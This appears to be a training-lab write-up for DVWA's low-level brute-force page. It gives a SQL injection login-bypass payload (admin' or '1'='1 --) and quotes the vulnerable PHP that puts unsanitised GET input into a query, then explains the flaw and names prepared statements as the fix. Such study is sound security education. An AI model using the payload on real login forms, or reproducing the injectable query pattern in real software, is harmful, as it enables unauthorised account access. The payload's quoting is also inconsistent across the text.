# Brute Force - Low 

---

## Attack Steps

1. Open the target page in the browser: 
    - http://<ip address>/dvwa/vulnerabilities/brute/

2. Enter the following credentials 

    ```sql
    Username: admin' or '1'='1 -- 
    Password: anything # Change the password to whatever
    ```

3. Observe login message 

    ```bash 
    Welcome to the password protected area admin' or '1'='1 --
    ```

--- 

## Vulnerable Code Analysis 

### File: 
`/var/www/dvwa/vulnerabilities/brute/source/low`

#### Key Vulnerability Points:

```php 

    $user = $_GET['username'];
    
    $pass = $_GET['password'];
    $pass = md5($pass);

    $qry = "SELECT * FROM `users` WHERE user='$user' AND password='$pass';";
    $result = mysql_query( $qry ) or die( '<pre>' . mysql_error() . '</pre>' ); 
```

### Explanation 
- The code is taking direct user input `$user = $_GET['username'];/$pass = $_GET['password'];`. The password is hashed using MD5 `$pass = md5($pass);` before the username and password hash is inserted into the SQL query.

- This can be exploited using the payload ' or '1'=1 --: 
    - The query will become "SELECT * FROM `users` WHERE user=' ' or '1'=1 -- ".
    - The ' ' will be ignored and the boolean value will always be true. 
    - The `--` will comment out the password section 

- Causes: 
    - No input validation or sanitisation on $user or $pass so users can input anything
    - Direct insertion of user input into queries means queries can be modified
    - Not using prepared statements, prepared statements treat user input only as data rather than SQL code so even if SQL keywords are included they won't modify the queries  